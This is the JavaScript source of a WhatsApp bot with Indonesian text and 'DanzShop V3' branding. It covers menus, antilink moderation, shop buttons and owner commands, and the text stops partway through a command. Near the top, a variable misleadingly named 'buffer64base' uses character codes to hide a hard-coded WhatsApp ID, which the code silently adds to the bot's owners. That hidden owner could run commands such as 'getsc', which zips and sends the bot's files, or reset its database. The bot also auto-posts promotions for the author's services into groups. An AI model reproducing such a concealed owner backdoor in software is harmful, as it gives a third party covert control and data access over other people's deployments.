process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');


module.exports = danz = async (danz, m, chatUpdate, store) => {
	try {
await LoadDataBase(danz, m)
const botNumber = await danz.decodeJid(danz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.mess || quoted).mimetype || ''
const qmess = (quoted.mess || quoted)


//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./image/dnzMg.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await danz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await danz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await danz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await danz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await danz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await danz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await danz.sendMessage(m.chat, {text: `
*DanzXzo Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Marga Xzo Yuk*
* *Grup Marga Xzo:*
https://chat.whatsapp.com/FyqffgGmrNYK1b52xECZtk
* *Channel Developer Xzo:*
https://whatsapp.com/channel/0029VanWm2F0rGiQROzHWG1W
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VayzScQAYlUNjXxhJf1Z

*👤 Contact DanzXzo*
* *WhatsApp Utama :*
+6285664637742
* *Telegram Utama*
https://t.me/devdx
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return danz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnail: fs.readFileSync("./image/dnzMg.jpg"), 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/dnzMg.jpg") }, { upload: danz.waUploadToServer })
const messii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*DanzXzo* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `YOUR TEKS
YOUR TEKS`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `YOUR TEKS
YOUR TEKS`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `YOUR TEKS
TEKS`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await danz.relayMessage(jid, messii.message, {messageId: messii.key.id})
}

//============= [ COMMANDS ] ====================================================

switch (command) {
case "menu": {
let menu = ` 
Haii ${m.pushName},
Perkenalkan, saya adalah *Base Bot*. klik tombol menu di bawah ini untuk mengetahui berbagai fitur yang dapat saya lakukan.
`
let buttons = [
  {
    buttonId: ".menu2", 
    buttonText: { 
      displayText: "Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            },
                externalAdReply: {
      title: `${botname} - ${versi}`,
      body: ``,
      thumbnailUrl: global.imgfake,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "tqto": {
let menu = `
I am very grateful for your help, because it helped me to create this script.

𝐓𝐡𝐚𝐧𝐤 𝐓𝐨

ᴅᴀɴᴢʜᴏsᴛɪɴɢ ( ᴅᴇᴠᴇʟᴏᴘᴇʀ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VayzScQAYlUNjXxhJf1Z
ʏᴏᴜᴛᴜʙᴇ : ɴᴏᴛ ғᴏᴜɴᴅ

sᴋʏᴢᴏᴘᴇᴅɪᴀ ( ᴍʏ ғʀɪᴇɴᴅ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s
ʏᴏᴜᴛᴜʙᴇ : @skyzodev

ᴡᴀɴʜᴏsᴛɪɴɢ ( ᴍʏ ғʀɪᴇɴᴅ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : ɴᴏᴛ ғᴏᴜɴᴅ
ʏᴏᴜᴛᴜʙᴇ : ɴᴏᴛ ғᴏᴜɴᴅ
`
let buttons = [
  {
    buttonId: ".menu", 
    buttonText: { 
      displayText: "Back"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

        let buttonMessage = {
        document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            },
                externalAdReply: {
      title: `${botname} - ${versi}`,
      body: ``,
      thumbnailUrl: global.imgfake,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case 'danz': {
let menu = `
BASE BUTTON
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "𝗔𝗹𝗹𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan semua menu botz",
                                    id: ".menu"
                                 },
                                                                {                                                                
                                    title: "𝗦𝗹𝗶𝗱𝗲",
                                    description: "JPM Otomatis teks slide button",
                                    id: ".jpmslide"
                                },
                                                                {
                                    title: "𝗦𝗹𝗶𝗱𝗲",
                                    description: "JPM Otomatis teks slide button hidetag",
                                    id: ".jpmslideht"
                                },
                                                                {
                                    title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟭",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom"
                                },
                                                                {
                                   title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟮",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom2"
                                   },
                                                                {
                                  title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟯",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom3"
                                   },
                                                                {
                                   title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟰",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom4"
                                   },
                                                                {
                                    title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟱",
                                    description: "Membuat Server Private",
                                    id: ".cprandom5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }, 
                externalAdReply: {
      title: `${botname} - ${versi}`,
      body: ``,
      thumbnailUrl: global.imgfake,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break
case 'menu2': {
let menu = `
TEKS INFO`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "𝗔𝗹𝗹𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan semua menu botz",
                                    id: ".menu"
                                },
                                                                {
                                    title: "𝗢𝘁𝗵𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu other",
                                    id: ".othermenu"
                                },
                                                                {
                                    title: "𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu search",
                                    id: ".searchmenu"
                                },
                                                                {
                                    title: "𝗧𝗼𝗼𝗹𝘀𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu tools V1",
                                    id: ".toolsmenu"
                                },
                                                                {
                                    title: "𝗦𝗵𝗼𝗽𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu Shop Otomatis",
                                    id: ".shopmenu"
                                },
                                                                {
                                    title: "𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu download",
                                    id: ".downloadmenu"
                                },
                                                                {
                                    title: "𝗦𝘁𝗼𝗿𝗲𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menustore",
                                    id: ".storemenu"
                                },
                                                                {
                                    title: "𝗣𝗮𝗻𝗲𝗹𝗺𝗲𝗻𝘂𝘀𝗲𝗹𝗹𝗲𝗿",
                                    description: "⚙️ Melihat Menupanelseller",
                                    id: ".menucpanel"
                                },
                                                                {
                                    title: "𝗣𝗮𝗻𝗲𝗹𝗺𝗲𝗻𝘂𝗼𝘄𝗻𝗲𝗿",
                                    description: "⚙️ Melihat Menupanelowner",
                                    id: ".menucpanel"
                                },
                                                                {
                                    title: "𝗹𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menuinstaller",
                                    id: ".toolsmenu"
                                   },
                                                                {
                                    title: "𝗚𝗿𝗼𝘂𝗽𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menugroup",
                                    id: ".groupmenu"
                                   },
                                                               {
                                    title: "𝗕𝘂𝘆𝗦𝗰𝗿𝗶𝗽𝘁",
                                    description: "⚙️ Menampilkan Menu Harga + Buy Script",
                                    id: ".buyscript"
                                   },
                                                                {
                                    title: "𝗢𝘄𝗻𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menuowner",
                                    id: ".ownermenu"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "hargascript": {
let menu = `
YOUR TEKS
`
let buttons = [
  {
    buttonId: ".menu", 
    buttonText: { 
      displayText: "Back To Frist Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    }

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case 'shopmenu': {
let menu = `
TEKS
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "𝗦𝗽𝗶𝗻",
                                    description: "🎰 Spin hadiah",
                                    id: ".spin"
                                 },
                                                                {                                                                
                                    title: "𝗞𝗼𝗰𝗼𝗸 𝗗𝗮𝗱𝘂",
                                    description: "🎲 Kocok dadu berhadiah",
                                    id: ".kocokdadu"
                                 },
                                                                {                                    
                                    title: "𝗟𝗼𝘁𝗿𝗲",
                                    description: "🧧 Random item hadiah",
                                    id: ".lotre"
                                },
                                                                {                                    
                                    title: "𝗖𝗲𝗸 𝗦𝗮𝗹𝗱𝗼",
                                    description: "🛍 Cek saldo",
                                    id: ".ceksaldo"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break
case "nama": {
let menu = `
Teks
`
let buttons = [
  {
    buttonId: ".hargapanel2", 
    buttonText: { 
      displayText: "Panel Private"
    }
  }, {
    buttonId: ".payment", 
    buttonText: {
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".shopmenu", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "nama19": {
let menu = `
Teke
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: { 
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Call Me"
    }
  }, {
    buttonId: ".shopmenu", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "nama10": {
let menu = `
TEKS
`
let buttons = [
  {
    buttonId: ".payment", 
    buttonText: { 
      displayText: "Pembayaran"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Call Me"
    }
  }, {
    buttonId: ".shopmenu", 
    buttonText: {
      displayText: "Back To Produk"   
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img102.pixhost.to/images/146/557564782_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzShop V3`
            }
        },
        footer: "© Copyright DanzShop V3 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break

case "self": {
if (!isCreator) return
danz.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./danz.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
danz.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await danz.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await danz.downloadAndSaveMediaMessage(qmess)
await danz.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await danz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await danz.downloadAndSaveMediaMessage(qmess)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await danz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await danz.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "setimgmenu": {
if (!isCreator) return Reply(mess.owner)
